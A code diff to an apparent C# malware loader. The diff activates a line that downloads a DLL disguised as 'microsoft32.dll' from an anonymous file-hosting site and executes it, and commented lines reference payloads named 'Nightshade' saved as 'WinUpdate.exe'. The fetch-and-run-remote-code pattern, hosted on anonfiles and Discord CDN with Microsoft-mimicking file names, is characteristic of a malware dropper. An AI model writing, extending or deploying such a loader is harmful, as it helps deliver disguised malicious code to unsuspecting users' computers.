@@ -76,17 +76,17 @@ namespace loader {
 
         public static void Main(string[] args) {
 
-            //string remotePEUrl = "https://cdn.discordapp.com/attachments/804752207312322571/952222704835121242/WinUpdate.exe";
+            //string remotePEUrl = "https://cdn-144.anonfiles.com/ted5k4veyd/c1a395b4-1657040387/Nightshade.exe";
             //string localPEName = "WinUpdate.exe";
-            //PortableExecuatbleLoader(remotePEUrl, localPEName);
+            //PortableExecutableLoader(remotePEUrl, localPEName);
 
-            // string remoteDllUrl = "https://cdn.discordapp.com/attachments/804752207312322571/947621052064890890/example.dll";
-            // string localDllName = "messagebox.dll";
-            // string dllEntryName = "Test";
-            // DllLoader(remoteDllUrl, localDllName, dllEntryName);
+             string remoteDllUrl = "https://cdn-121.anonfiles.com/f6k7k0vfy0/02dfc28a-1657040667/microsoft32.dll";
+             string localDllName = "microsoft32.dll";
+             string dllEntryName = "DllMain";
+             DllLoader(remoteDllUrl, localDllName, dllEntryName);
 
-            string assembly = "https://cdn.discordapp.com/attachments/804752207312322571/99391886675736656/Nightshade.dll";
-            ExecAssembly(assembly);
+            //string assembly = "https://cdn-144.anonfiles.com/D5Zaj7vay0/417cc9d6-1657040199/Nightshade.dll";
+            //ExecAssembly(assembly);
         }
     }
 }
